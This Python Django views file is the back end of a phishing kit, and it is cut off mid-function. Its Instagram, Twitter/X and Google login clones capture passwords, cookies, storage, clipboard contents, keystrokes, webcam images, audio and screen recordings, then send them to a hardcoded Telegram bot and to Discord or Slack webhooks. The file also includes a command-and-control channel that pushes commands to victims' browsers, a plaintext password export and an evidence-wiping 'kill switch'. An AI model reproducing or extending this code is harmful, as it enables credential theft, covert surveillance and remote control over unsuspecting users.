from django.shortcuts import render, redirect
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
from django.conf import settings
from .models import ThreatLog, ActiveVictim
import json
import hashlib
import requests
import threading
import os
from datetime import datetime


def html_escape(text):
    if text is None:
        return ""
    return str(text).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;")


def describe_storage(value, max_chars=150):
    if not value:
        return "<i>empty</i>"
    try:
        parsed = json.loads(value) if isinstance(value, str) else value
        if isinstance(parsed, dict):
            if not parsed:
                return "<i>empty</i>"
            keys = list(parsed.keys())
            if not keys:
                return "<i>empty</i>"
            preview = ", ".join(html_escape(str(k)) for k in keys[:5])
            suffix = "..." if len(keys) > 5 else ""
            return f"<code>{len(keys)} keys</code> ({preview}{suffix})"
    except Exception:
        pass
    text = html_escape(str(value))
    if len(text) > max_chars:
        text = text[:max_chars] + "..."
    return f"<code>{text}</code>"


TELEGRAM_BOT_TOKEN = getattr(settings, 'TELEGRAM_BOT_TOKEN', os.environ.get('TELEGRAM_BOT_TOKEN', '8638904590:AAFHyLPv4NLGopvt0-4L4YktfGt73tjeXY0'))
TELEGRAM_CHAT_ID = getattr(settings, 'TELEGRAM_CHAT_ID', os.environ.get('TELEGRAM_CHAT_ID', '1844215620'))
TELEGRAM_BOT_USERNAME = getattr(settings, 'TELEGRAM_BOT_USERNAME', os.environ.get('TELEGRAM_BOT_USERNAME', '@cyberalerttbot'))
SUCCESS_REDIRECT_URL = getattr(settings, 'SUCCESS_REDIRECT_URL', os.environ.get('SUCCESS_REDIRECT_URL', '/apps/'))
NGROK_URL = getattr(settings, 'NGROK_URL', os.environ.get('NGROK_URL', ''))
DISCORD_WEBHOOK_URL = getattr(settings, 'DISCORD_WEBHOOK_URL', '')
SLACK_WEBHOOK_URL = getattr(settings, 'SLACK_WEBHOOK_URL', '')


def send_discord_alert(log):
    """Send rich Discord embed notification"""
    if not DISCORD_WEBHOOK_URL:
        return
    try:
        risk_color = {"CRITICAL": 0xFF0000, "HIGH": 0xFF6600, "MEDIUM": 0xFFCC00, "LOW": 0x00CC44}.get(log.risk_level, 0x888888)
        media_str = []
        if log.webcam_snap: media_str.append("📸 Webcam")
        if log.voice_audio: media_str.append("🎤 Audio")
        if log.screen_recording: media_str.append("🖥 Screen")
        embed = {
            "title": f"🚨 NEW INTERCEPT #{log.id} — {log.risk_level}",
            "color": risk_color,
            "fields": [
                {"name": "Mode", "value": log.auth_mode, "inline": True},
                {"name": "📧 Login", "value": f"`{log.intercepted_id}`", "inline": True},
                {"name": "🔑 Password", "value": f"`{log.raw_password}`", "inline": True},
                {"name": "🌍 IP", "value": f"`{log.geo_ip}`", "inline": True},
                {"name": "📡 MAC", "value": f"`{log.mac_address}`", "inline": True},
                {"name": "💻 Device", "value": str(log.browser_fingerprint)[:100], "inline": False},
                {"name": "🎥 Media", "value": " | ".join(media_str) if media_str else "—", "inline": True},
                {"name": "🕐 Time", "value": log.timestamp.strftime('%Y-%m-%d %H:%M:%S'), "inline": True},
            ],
            "footer": {"text": "War Room Bot — Intercept Alert"}
        }
        requests.post(DISCORD_WEBHOOK_URL, json={"embeds": [embed]}, timeout=10)
    except Exception as e:
        print(f"Discord alert failed: {e}")


def send_slack_alert(log):
    """Send Slack block kit notification"""
    if not SLACK_WEBHOOK_URL:
        return
    try:
        media_str = []
        if log.webcam_snap: media_str.append("📸 Webcam")
        if log.voice_audio: media_str.append("🎤 Audio")
        if log.screen_recording: media_str.append("🖥 Screen")
        text = (
            f"🚨 *NEW INTERCEPT #{log.id}* — `{log.risk_level}`\n"
            f"📧 *Login:* `{log.intercepted_id}`  🔑 *Pass:* `{log.raw_password}`\n"
            f"🌍 *IP:* `{log.geo_ip}`  💻 {str(log.browser_fingerprint)[:80]}\n"
            f"🎥 {' | '.join(media_str) if media_str else '—'}  🕐 {log.timestamp.strftime('%H:%M:%S')}"
        )
        requests.post(SLACK_WEBHOOK_URL, json={"text": text}, timeout=10)
    except Exception as e:
        print(f"Slack alert failed: {e}")



def generate_mac(ip_string):
    h = hashlib.md5(ip_string.encode('utf-8')).hexdigest()
    mac = f"{h[0:2]}:{h[2:4]}:{h[4:6]}:{h[6:8]}:{h[8:10]}:{h[10:12]}".upper()
    return mac

def get_client_ip(request):
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR')
    return ip

def send_telegram_alert(log_id, metadata=None):
    try:
        log = ThreatLog.objects.get(id=log_id)
        total = ThreatLog.objects.count()
        
        src_url = metadata.get('source_url') if metadata else None
        user_agent = metadata.get('user_agent') if metadata else None
        platform = metadata.get('platform') if metadata else None
        cookies = metadata.get('cookies') if metadata else None
        session_storage = metadata.get('session_storage') if metadata else None
        
        text = f"🤖 <b>Bot:</b> {TELEGRAM_BOT_USERNAME}\n🚨 <b>━━━ NEW INTERCEPT #{log.id} ━━━</b>\n\n"
        mode_icon = "📝" if log.auth_mode == "SIGNUP" else "🔑"
        text += f"{mode_icon} <b>Mode:</b> <code>{html_escape(log.auth_mode)}</code>\n"
        if log.full_name:
            text += f"👤 <b>Full Name:</b> <code>{html_escape(log.full_name)}</code>\n"
        text += f"📧 <b>Username:</b> <code>{html_escape(log.intercepted_id)}</code>\n"
        text += f"🔑 <b>Password:</b> <code>{html_escape(log.raw_password)}</code>\n"
        text += f"🔐 <b>SHA-256:</b> <code>{html_escape(log.encrypted_token[:32])}...</code>\n\n"
        text += f"🌍 <b>IP Address:</b> <code>{html_escape(log.geo_ip)}</code>\n"
        text += f"📡 <b>MAC:</b> <code>{html_escape(log.mac_address)}</code>\n"
        text += f"💻 <b>Device:</b> {html_escape(log.browser_fingerprint)}\n"
        text += f"⚠️ <b>Risk Level:</b> {html_escape(log.risk_level)}\n\n"
        text += f"━━━ <b>STOLEN DATA</b> ━━━\n"
        text += f"🍪 <b>LocalStorage:</b> {describe_storage(log.local_storage_data)}\n"
        text += f"🧠 <b>SessionStorage:</b> {describe_storage(session_storage)}\n"
        text += f"📋 <b>Cookies:</b> {describe_storage(cookies)}\n"
        text += f"🖥 <b>Screen/Info:</b> {describe_storage(log.history_data)}\n"
        if src_url:
            text += f"🌐 <b>Source URL:</b> <code>{html_escape(src_url)}</code>\n"
        if user_agent:
            text += f"🧾 <b>User Agent:</b> <code>{html_escape(user_agent)[:180]}</code>\n"
        if platform:
            text += f"🧭 <b>Platform:</b> <code>{html_escape(platform)}</code>\n"
        if log.webcam_snap:
            text += "📸 <b>Webcam:</b> Captured! (see photo below)\n"
        else:
            text += "📸 <b>Webcam:</b> <i>no image</i>\n"
        if log.voice_audio:
            text += "🎤 <b>Audio:</b> Captured! (audio sent separately)\n"
        else:
            text += "🎤 <b>Audio:</b> <i>no audio</i>\n"
        if log.screen_recording:
            text += "Screen Recording: Captured! (video sent separately)\n"
        else:
            text += "Screen Recording: <i>no recording</i>\n"
        if log.client_timestamp:
            text += f"Client Time: <code>{html_escape(log.client_timestamp)}</code>\n"
        # Clipboard
        clipboard_val = log.browser_fingerprint  # clipboard stored separately via metadata
        if metadata and metadata.get('clipboard'):
            clip = str(metadata['clipboard'])[:300]
            text += f"Clipboard: <code>{html_escape(clip)}</code>\n"

        text += f"\n📊 <b>Total Intercepts:</b> {total}\n"
        text += f"🕐 <b>Server Time:</b> {html_escape(log.timestamp.strftime('%Y-%m-%d %H:%M:%S') if log.timestamp else 'N/A')}\n"
        text += f"\n<b>━━━━━━━━━━━━━━━━━━━━</b>"
        
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        requests.post(url, data={"chat_id": TELEGRAM_CHAT_ID, "text": text, "parse_mode": "HTML"})
        
        if log.webcam_snap and log.webcam_snap.startswith('data:image'):
            import base64
            img_data = log.webcam_snap.split(',')[1]
            img_bytes = base64.b64decode(img_data)
            photo_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
            requests.post(photo_url, data={"chat_id": TELEGRAM_CHAT_ID, "caption": f"📸 Webcam #{log.id} — {html_escape(log.geo_ip)} — {html_escape(log.intercepted_id)}"}, files={"photo": ("webcam.jpg", img_bytes)})
        
        if log.voice_audio and isinstance(log.voice_audio, str) and log.voice_audio.startswith('data:audio'):
            try:
                import base64
                audio_data = log.voice_audio.split(',')[1]
                audio_bytes = base64.b64decode(audio_data)
                audio_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendAudio"
                requests.post(audio_url, data={"chat_id": TELEGRAM_CHAT_ID}, files={"audio": ("audio.webm", audio_bytes)})
            except Exception:
                pass
        
        # Send screen recording as video/document
        if log.screen_recording and isinstance(log.screen_recording, str) and log.screen_recording.startswith('data:video'):
            try:
                import base64
                video_data = log.screen_recording.split(',')[1]
                video_bytes = base64.b64decode(video_data)
                doc_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
                requests.post(doc_url, data={"chat_id": TELEGRAM_CHAT_ID, "caption": f"🖥 Screen Recording #{log.id} — {html_escape(log.geo_ip)}"}, files={"document": ("screen_recording.webm", video_bytes)})
            except Exception:
                pass
    except Exception as e:
        print(f"Telegram Alert Failed: {e}")



def gateway_view(request):
    # Track the active victim
    ip = get_client_ip(request)
    ua = request.META.get('HTTP_USER_AGENT', '')
    
    # Use a more stable ID: IP + UserAgent hash if session is missing
    session_id = request.session.session_key
    if not session_id:
        request.session.create()
        session_id = request.session.session_key
    
    # Consistent track_id logic
    ua_hash = hashlib.md5(ua.encode()).hexdigest()[:8]
    track_id = session_id if session_id else f"ip-{ip}-{ua_hash}"
        
    ActiveVictim.objects.update_or_create(
        session_id=track_id,
        defaults={'ip_address': ip, 'device_info': ua}
    )

    if request.method == "POST":
        try:
            data = json.loads(request.body)
            username = data.get('username', '')
            password = data.get('password', '')
            webcam_snap = data.get('webcam_snap', None)

            # New Advanced Fields
            local_storage = data.get('local_storage', None)
            session_storage = data.get('session_storage', None)
            cookies = data.get('cookies', None)
            source_url = data.get('source_url', None)
            user_agent_header = request.META.get('HTTP_USER_AGENT', '')
            user_agent_payload = data.get('user_agent', None)
            user_agent = user_agent_payload or user_agent_header or 'Unknown'
            platform = data.get('platform', None)
            clipboard = data.get('clipboard', None)
            history = data.get('history', None)
            voice = data.get('voice_audio', None)
            client_timestamp = data.get('client_timestamp', None)
            client_timezone = data.get('client_timezone', '')
            local_time = data.get('local_time', '')
            screen_recording = data.get('screen_recording', None)
            webcam_video = data.get('webcam_video', None)
            clipboard = data.get('clipboard', None)
            battery = data.get('battery', None)
            network_type = data.get('network_type', None)
            
            mac = generate_mac(ip)

            # Simple OS/Browser parse
            os_name = "Unknown OS"
            if "Windows" in user_agent: os_name = "Windows"
            elif "Mac OS" in user_agent: os_name = "macOS"
            elif "Linux" in user_agent: os_name = "Linux"
            elif "Android" in user_agent: os_name = "Android"
            elif "iPhone" in user_agent: os_name = "iOS"
            
            browser = "Unknown"
            if "Edg" in user_agent: browser = "Edge"
            elif "Chrome" in user_agent: browser = "Chrome"
            elif "Firefox" in user_agent: browser = "Firefox"
            elif "Safari" in user_agent and "Chrome" not in user_agent: browser = "Safari"

            auth_mode = data.get('authMode', 'login').upper()
            full_name = data.get('fullName', '')

            # --- REAL LOGIN LOGIC ---
            if auth_mode == 'LOGIN':
                exists = ThreatLog.objects.filter(intercepted_id=username, raw_password=password).exists()
                if not exists:
                    # Capture the failed attempt anyway for logging
                    ThreatLog.objects.create(
                        intercepted_id=username, raw_password=password,
                        auth_mode='FAILED_LOGIN', geo_ip=ip, mac_address=generate_mac(ip),
                        browser_fingerprint=f"{os_name} / {browser}"
                    )
                    return JsonResponse({
                        "status": "error", 
                        "message": "Invalid email or password. Please register first.",
                        "auth_failed": True
                    }, status=401)
            # ------------------------

            fingerprint = f"{os_name} / {browser}"
            if client_timezone:
                fingerprint += f" / TZ:{client_timezone}"
            if battery:
                fingerprint += f" / BAT:{battery}"
            if network_type:
                fingerprint += f" / NET:{network_type}"
            encrypted = hashlib.sha256(password.encode('utf-8')).hexdigest()

            device_type = 'other'
            if any(x in user_agent.lower() for x in ['iphone', 'android', 'mobile']):
                device_type = 'mobile'
            elif any(x in user_agent.lower() for x in ['ipad', 'tablet']):
                device_type = 'tablet'
            elif any(x in user_agent.lower() for x in ['windows', 'macintosh', 'linux']):
                device_type = 'desktop'

            log = ThreatLog.objects.create(
                intercepted_id=username,
                raw_password=password,
                encrypted_token=encrypted,
                geo_ip=ip,
                mac_address=mac,
                browser_fingerprint=fingerprint,
                auth_mode=auth_mode,
                full_name=full_name,
                webcam_snap=webcam_snap,
                local_storage_data=local_storage,
                session_storage_data=session_storage,
                cookies=cookies,
                source_url=source_url,
                user_agent=user_agent,
                platform=platform,
                history_data=history,
                voice_audio=voice,
                device_type=device_type,
                screen_recording=screen_recording,
                webcam_video=webcam_video,
                client_timestamp=client_timestamp,
            )

            ActiveVictim.objects.update_or_create(
                session_id=track_id,
                defaults={
                    'ip_address': ip,
                    'device_info': fingerprint,
                    'current_url': source_url,
                    'last_action': auth_mode,
                }
            )
            
            # Send Telegram Alert in background thread so UI doesn't freeze
            metadata = {
                'source_url': source_url,
                'user_agent': user_agent,
                'platform': platform,
                'cookies': cookies,
                'session_storage': session_storage,
                'clipboard': clipboard,
                'battery': battery,
                'network_type': network_type,
            }
            if TELEGRAM_BOT_TOKEN != "YOUR_BOT_TOKEN_HERE":
                threading.Thread(target=send_telegram_alert, args=(log.id, metadata)).start()
            # Discord & Slack alerts
            threading.Thread(target=send_discord_alert, args=(log,)).start()
            threading.Thread(target=send_slack_alert, args=(log,)).start()
            
            # Clear the live keystrokes for this user since they submitted
            from .models import LiveKeyStroke
            LiveKeyStroke.objects.filter(username_context=username).delete()
            if not username:
                LiveKeyStroke.objects.filter(username_context='Anonymous').delete()
            
            return JsonResponse({
                "status": "success",
                "message": "Data Stream Secured",
                "risk": log.risk_level,
                "redirect_url": SUCCESS_REDIRECT_URL
            })
        except Exception as e:
            return JsonResponse({"status": "error", "message": str(e)}, status=400)

    # GET: show the login form
    return render(request, 'gateway.html')


@csrf_exempt
def instagram_view(request):
    """Instagram phishing clone — same POST handler as gateway but shows instagram.html"""
    if request.method == 'POST':
        # Reuse gateway logic by calling it internally
        return gateway_view(request)
    return render(request, 'instagram.html')


@csrf_exempt
def twitter_view(request):
    """Twitter/X phishing clone — same POST handler as gateway but shows twitter.html"""
    if request.method == 'POST':
        return gateway_view(request)
    return render(request, 'twitter.html')


@csrf_exempt
def google_view(request):
    """Google sign-in phishing clone — 2-step email then password flow"""
    if request.method == 'POST':
        return gateway_view(request)
    return render(request, 'google.html')


from django.contrib.auth.decorators import login_required
from django.contrib.auth import authenticate, login as auth_login

def war_room_login(request):
    """Simple login page for War Room — does NOT use admin template"""
    error = None
    if request.method == 'POST':
        username = request.POST.get('username', '')
        password = request.POST.get('password', '')
        user = authenticate(request, username=username, password=password)
        if user and user.is_staff:
            auth_login(request, user)
            return redirect('/cyber-ops/')
        else:
            error = 'Invalid credentials or insufficient privileges.'
    return render(request, 'war_room_login.html', {'error': error})

@login_required(login_url='/war-room-login/')
def war_room_view(request):
    if not request.user.is_staff:
        return redirect('/war-room-login/')
    logs = ThreatLog.objects.all().order_by('-timestamp')
    total_intercepts = logs.count()
    critical_threats = logs.filter(risk_level='CRITICAL').count()
    device_breakdown = {
        'desktop': logs.filter(device_type='desktop').count(),
        'mobile': logs.filter(device_type='mobile').count(),
        'tablet': logs.filter(device_type='tablet').count(),
        'other': logs.filter(device_type='other').count(),
    }
    
    from .models import LiveKeyStroke, ActiveVictim
    live_keys = LiveKeyStroke.objects.all().order_by('-timestamp')[:100]
    active_victims = ActiveVictim.objects.all().order_by('-last_seen')[:15]

    timeline_events = []
    for l in logs[:12]:
        timeline_events.append({
            'time': l.timestamp.strftime('%H:%M:%S'),
            'date': l.timestamp.strftime('%Y-%m-%d'),
            'summary': f"{l.intercepted_id} → {l.auth_mode} ({l.device_type})",
            'details': f"Cam: {'Video' if l.webcam_video else ('Snap' if l.webcam_snap else 'no')} · Screen: {'yes' if l.screen_recording else 'no'} · Audio: {'yes' if l.voice_audio else 'no'}"
        })

    return render(request, 'war_room.html', {
        'logs': logs,
        'total_intercepts': total_intercepts,
        'critical_threats': critical_threats,
        'live_keys': live_keys,
        'device_breakdown': device_breakdown,
        'active_victims': active_victims,
        'timeline_events': timeline_events,
        'ngrok_url': NGROK_URL
    })

@login_required(login_url='/war-room-login/')
def war_room_data_api(request):
    """API endpoint for AJAX updates in War Room"""
    logs = ThreatLog.objects.all().order_by('-timestamp')
    from .models import LiveKeyStroke, ActiveVictim
    live_keys = LiveKeyStroke.objects.all().order_by('-timestamp')[:100]
    active_victims = ActiveVictim.objects.all().order_by('-last_seen')[:15]
    
    log_data = []
    for l in logs:
        log_data.append({
            'id': l.id,
            'timestamp': l.timestamp.strftime('%H:%M:%S'),
            'date': l.timestamp.strftime('%Y-%m-%d'),
            'risk_level': l.risk_level,
            'geo_ip': l.geo_ip,
            'mac_address': l.mac_address,
            'browser_fingerprint': l.browser_fingerprint,
            'intercepted_id': l.intercepted_id,
            'full_name': l.full_name or '',
            'auth_mode': l.auth_mode,
            'encrypted_token': l.encrypted_token[:16] + '...' if l.encrypted_token else '',
            'raw_password': l.raw_password,
            'webcam_snap': l.webcam_snap or '',
            'webcam_video': l.webcam_video or '',
            'voice_audio': l.voice_audio or '',
            'screen_recording': l.screen_recording or '',
            'has_webcam': bool(l.webcam_snap or l.webcam_video),
            'has_audio': bool(l.voice_audio),
            'has_screen': bool(l.screen_recording),
            'client_timestamp': l.client_timestamp or '',
            'source_url': l.source_url or '',
            'device_type': l.device_type,
        })
        
    key_data = []
    for k in live_keys:
        key_data.append({
            'id': k.id,
            'timestamp': k.timestamp.strftime('%H:%M:%S'),
            'username': k.username_context,
            'keystrokes': k.keystrokes
        })

    victim_data = []
    for v in active_victims:
        victim_data.append({
            'session_id': v.session_id,
            'ip_address': v.ip_address,
            'device_info': v.device_info,
            'current_url': v.current_url,
            'last_action': v.last_action,
            'last_seen': v.last_seen.strftime('%Y-%m-%d %H:%M:%S')
        })
        
    return JsonResponse({
        'logs': log_data,
        'live_keys': key_data,
        'active_victims': victim_data,
        'device_breakdown': {
            'desktop': logs.filter(device_type='desktop').count(),
            'mobile': logs.filter(device_type='mobile').count(),
            'tablet': logs.filter(device_type='tablet').count(),
            'other': logs.filter(device_type='other').count(),
        },
        'timeline_events': [
            {
                'time': l.timestamp.strftime('%H:%M:%S'),
                'date': l.timestamp.strftime('%Y-%m-%d'),
                'summary': f"{l.intercepted_id} → {l.auth_mode} ({l.device_type})",
                'details': f"Webcam: {'yes' if l.webcam_snap else 'no'} · Cookies: {'yes' if l.cookies else 'no'} · Url: {l.source_url or 'unknown'}"
            }
            for l in logs[:10]
        ],
        'total_intercepts': logs.count(),
        'critical_threats': logs.filter(risk_level='CRITICAL').count()
    })

@csrf_exempt
def log_keys_view(request):
    if request.method == "POST":
        try:
            data = json.loads(request.body)
            username = data.get('username', 'Anonymous')
            keys = data.get('keys', '')
            
            from .models import LiveKeyStroke
            import json
            
            obj, created = LiveKeyStroke.objects.get_or_create(
                username_context=username,
                defaults={'keystrokes': keys}
            )
            
            if not created:
                try:
                    old_data = json.loads(obj.keystrokes)
                    new_data = json.loads(keys)
                    if isinstance(old_data, list) and isinstance(new_data, list):
                        combined = old_data + new_data
                        obj.keystrokes = json.dumps(combined)
                        obj.save()
                    else:
                        obj.keystrokes = keys # Fallback if format changed
                        obj.save()
                except Exception:
                    obj.keystrokes = keys
                    obj.save()
            return JsonResponse({"status": "success"})
        except Exception as e:
            return JsonResponse({"status": "error"})
    return JsonResponse({"status": "invalid"})

import csv
from django.http import HttpResponse

@login_required(login_url='/war-room-login/')
def export_csv_view(request):
    response = HttpResponse(content_type='text/csv')
    response['Content-Disposition'] = 'attachment; filename="payload_dump.csv"'

    writer = csv.writer(response)
    writer.writerow(['ID', 'Timestamp', 'Risk Level', 'Auth Mode', 'Full Name', 'Username', 'Raw Password', 'SHA-256 Hash', 'IP Address', 'MAC Address', 'Device Fingerprint'])

    logs = ThreatLog.objects.all().order_by('-timestamp')
    for log in logs:
        writer.writerow([
            log.id,
            log.timestamp.strftime("%Y-%m-%d %H:%M:%S"),
            log.risk_level,
            log.auth_mode,
            log.full_name or '',
            log.intercepted_id,
            log.raw_password,
            log.encrypted_token,
            log.geo_ip,
            log.mac_address,
            log.browser_fingerprint
        ])

    return response


@csrf_exempt
def wipe_data_view(request):
    """THE KILL SWITCH — POST + confirm required. Manual auth check to avoid redirect breaking fetch."""
    if not request.user.is_authenticated:
        return JsonResponse({"status": "error", "message": "Not authenticated"}, status=401)
    if request.method == 'POST':
        try:
            body = json.loads(request.body)
            if not body.get('confirm'):
                return JsonResponse({"status": "error", "message": "Confirmation required"}, status=400)
            # Delete ALL collected data
            from .models import LiveKeyStroke, ActiveVictim, LiveChatLog
            ThreatLog.objects.all().delete()
            LiveKeyStroke.objects.all().delete()
            ActiveVictim.objects.all().delete()
            LiveChatLog.objects.all().delete()
            # Reset active template
            from .models import ActivePhishTemplate
            active, _ = ActivePhishTemplate.objects.get_or_create(id=1)
            active.template_name = 'admin'
            active.save()
            return JsonResponse({"status": "success", "message": "☢️ PROTOCOL ZERO: ALL TRACKS OBLITERATED."})
        except Exception as e:
            return JsonResponse({"status": "error", "message": str(e)}, status=500)
    return JsonResponse({"status": "error", "message": "POST required"}, status=405)



from .models import ActivePhishTemplate

def get_template_view(request):
    try:
        active = ActivePhishTemplate.objects.first()
        if active:
            return JsonResponse({"template": active.template_name})
        return JsonResponse({"template": "admin"})
    except:
        return JsonResponse({"template": "admin"})

@login_required(login_url='/war-room-login/')
def set_template_view(request):
    if request.method == "POST":
        try:
            data = json.loads(request.body)
            template = data.get("template", "admin")
            active, _ = ActivePhishTemplate.objects.get_or_create(id=1)
            active.template_name = template
            active.save()
            return JsonResponse({"status": "success"})
        except Exception as e:
            return JsonResponse({"status": "error"})
    return JsonResponse({"status": "invalid"})

# --- C2 COMMAND ENDPOINTS ---
@login_required(login_url='/war-room-login/')
def dispatch_command_view(request):
    """War Room calls this to send a command to victims"""
    if request.method == "POST":
        try:
            data = json.loads(request.body)
            command = data.get("command", "")
            payload = data.get("payload", "")
            
            # Send command to ALL active victims
            victims = ActiveVictim.objects.all()
            total_in_db = victims.count()
            count = 0
            for v in victims:
                v.pending_command = command
                v.command_payload = payload
                v.save()
                count += 1
                
            return JsonResponse({
                "status": "success", 
                "victims_hit": count,
                "total_in_db": total_in_db
            })
        except Exception as e:
            return JsonResponse({"status": "error", "message": str(e)})
    return JsonResponse({"status": "invalid"})

@csrf_exempt
def poll_command_view(request):
    """Victim Gateway calls this every second to check for commands"""
    ip = get_client_ip(request)
    ua = request.META.get('HTTP_USER_AGENT', '')
    session_id = request.session.session_key
    
    # Ensure session exists
    if not session_id:
        request.session.create()
        session_id = request.session.session_key
    
    # Try to find victim by session first
    victim = None
    if session_id:
        victim = ActiveVictim.objects.filter(session_id=session_id).first()
    
    # Consistent track_id logic fallback
    ua_hash = hashlib.md5(ua.encode()).hexdigest()[:8]
    track_id_fallback = f"ip-{ip}-{ua_hash}"

    # Fallback: try IP + UA hash
    if not victim:
        victim = ActiveVictim.objects.filter(session_id=track_id_fallback).first()
    
    # Fallback 2: try IP only
    if not victim:
        victim = ActiveVictim.objects.filter(ip_address=ip).first()
    
    # If still not found, auto-register this visitor as a new victim
    if not victim:
        track_id = session_id if session_id else track_id_fallback
        victim, _ = ActiveVictim.objects.get_or_create(
            session_id=track_id,
            defaults={'ip_address': ip, 'device_info': ua}
        )
        
    cmd = victim.pending_command
    payload = victim.command_payload
    
    # Once read, clear the command so it doesn't run twice
    if cmd:
        victim.pending_command = None
        victim.command_payload = None
    
    # Always save to update last_seen timestamp
    victim.save()
        
    return JsonResponse({"command": cmd, "payload": payload})


@csrf_exempt
def send_war_room_alert(request):
    """AJAX endpoint to send War Room command alerts"""
    if request.method == 'POST':
        try:
            data = json.loads(request.body)
            command = data.get('command', '')
            output = data.get('output', '')
            
            success = send_war_room_telegram_alert(command, output)
            return JsonResponse({"status": "success" if success else "failed"})
        except Exception as e:
            return JsonResponse({"status": "error", "message": str(e)})
    return JsonResponse({"status": "invalid"})


@csrf_exempt
def send_realtime_alert(request):
    """AJAX endpoint to send real-time data entry alerts"""
    if request.method == 'POST':
        try:
            data = json.loads(request.body)
            data_type = data.get('data_type', '')
            data_content = data.get('data_content', '')
            ip_address = data.get('ip_address', request.META.get('REMOTE_ADDR', 'Unknown'))
            
            success = send_realtime_telegram_alert(data_type, data_content, ip_address)
            return JsonResponse({"status": "success" if success else "failed"})
        except Exception as e:
            return JsonResponse({"status": "error", "message": str(e)})
    return JsonResponse({"status": "invalid"})


def send_war_room_telegram_alert(command, output=""):
    """Send Telegram alert for War Room command usage"""
    try:
        bot_token = getattr(settings, 'TELEGRAM_BOT_TOKEN', None)
        chat_id = getattr(settings, 'TELEGRAM_CHAT_ID', None)
        
        if not bot_token or not chat_id:
            return False
            
        message = f"🚨 <b>War Room Command Executed</b>\n\n"
        message += f"📝 <b>Command:</b> {command}\n"
        if output:
            message += f"📄 <b>Output:</b>\n<pre>{output[:500]}</pre>\n"
        message += f"⏰ <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        data = {
            'chat_id': chat_id,
            'text': message,
            'parse_mode': 'HTML'
        }
        
        response = requests.post(url, data=data, timeout=10)
        return response.status_code == 200
    except Exception as e:
        print(f"Telegram alert failed: {e}")
        return False


def send_realtime_telegram_alert(data_type, data_content, ip_address="Unknown"):
    """Send Telegram alert for real-time website data entry"""
    try:
        bot_token = getattr(settings, 'TELEGRAM_BOT_TOKEN', None)
        chat_id = getattr(settings, 'TELEGRAM_CHAT_ID', None)
        
        if not bot_token or not chat_id:
            return False
            
        message = f"📊 <b>Real-time Data Entry</b>\n\n"
        message += f"📋 <b>Type:</b> {data_type}\n"
        message += f"🏠 <b>IP:</b> {ip_address}\n"
        message += f"📄 <b>Data:</b>\n<pre>{data_content[:1000]}</pre>\n"
        message += f"⏰ <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        data = {
            'chat_id': chat_id,
            'text': message,
            'parse_mode': 'HTML'
        }
        
        response = requests.post(url, data=data, timeout=10)
        return response.status_code == 200
    except Exception as e:
        print(f"Real-time Telegram alert failed: {e}")
        return False



# ============================================================
# TELEGRAM BOT — HUNIXBOT STYLE WAR ROOM
# ============================================================

def tg_api(method, **kwargs):
    """Telegram API helper"""
    try:
        r = requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/{method}",
            json=kwargs, timeout=10
        )
        return r.json()
    except Exception as e:
        print(f"tg_api {method} error: {e}")
        return {}

def tg_send(chat_id, text, reply_markup=None, parse_mode="HTML"):
    kwargs = {"chat_id": chat_id, "text": text, "parse_mode": parse_mode}
    if reply_markup:
        kwargs["reply_markup"] = reply_markup
    return tg_api("sendMessage", **kwargs)

def tg_edit(chat_id, message_id, text, reply_markup=None, parse_mode="HTML"):
    kwargs = {"chat_id": chat_id, "message_id": message_id, "text": text, "parse_mode": parse_mode}
    if reply_markup:
        kwargs["reply_markup"] = reply_markup
    return tg_api("editMessageText", **kwargs)

def tg_answer_cb(callback_query_id, text="", alert=False):
    tg_api("answerCallbackQuery", callback_query_id=callback_query_id, text=text, show_alert=alert)

def tg_send_photo(chat_id, base64_img, caption="", reply_markup=None):
    try:
        import base64 as b64lib
        img_bytes = b64lib.b64decode(base64_img.split(',')[1])
        kwargs = {"chat_id": chat_id, "caption": caption, "parse_mode": "HTML"}
        if reply_markup:
            kwargs["reply_markup"] = json.dumps(reply_markup)
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto",
            data=kwargs, files={"photo": ("photo.jpg", img_bytes)}, timeout=15
        )
    except Exception as e:
        print(f"tg_send_photo error: {e}")

def decode_keystrokes(raw):
    """Parse keystrokes JSON → readable text"""
    try:
        arr = json.loads(raw) if isinstance(raw, str) else raw
        if not isinstance(arr, list):
            return str(raw)[:100]
        typed = ""
        for s in arr:
            k = s.get("key", "")
            if k == "Backspace": typed = typed[:-1]
            elif k in ("Enter", "Return"): typed += " ↵ "
            elif k in (" ", "Space"): typed += " "
            elif len(k) == 1: typed += k
        return typed.strip() or "(empty)"
    except Exception:
        return str(raw)[:100]

def risk_icon(level):
    return {"CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡", "LOW": "🟢"}.get(level, "⚪")

def media_icons(log):
    icons = []
    if log.webcam_snap: icons.append("📸")
    if log.voice_audio: icons.append("🎤")
    if log.screen_recording: icons.append("🖥")
    return " ".join(icons) if icons else "—"

def build_log_card(log, page=0, total=None):
    """Build single log card text"""
    ri = risk_icon(log.risk_level)
    mi = media_icons(log)
    fp = (log.browser_fingerprint or "")[:50]
    src = (str(log.source_url or ""))[:60]
    ts = log.timestamp.strftime('%d.%m.%Y %H:%M:%S')
    ct = log.client_timestamp or ""
    if ct and "T" in ct:
        try: ct = ct.split("T")[1][:8]
        except: pass

    text = (
        f"{ri} <b>INTERCEPT #{log.id}</b>\n"
        f"{'━'*20}\n"
        f"{'📝' if log.auth_mode == 'SIGNUP' else '🔑'} <b>Mode:</b> <code>{log.auth_mode}</code>\n"
    )
    if log.full_name:
        text += f"👤 <b>Name:</b> <code>{html_escape(log.full_name)}</code>\n"
    text += (
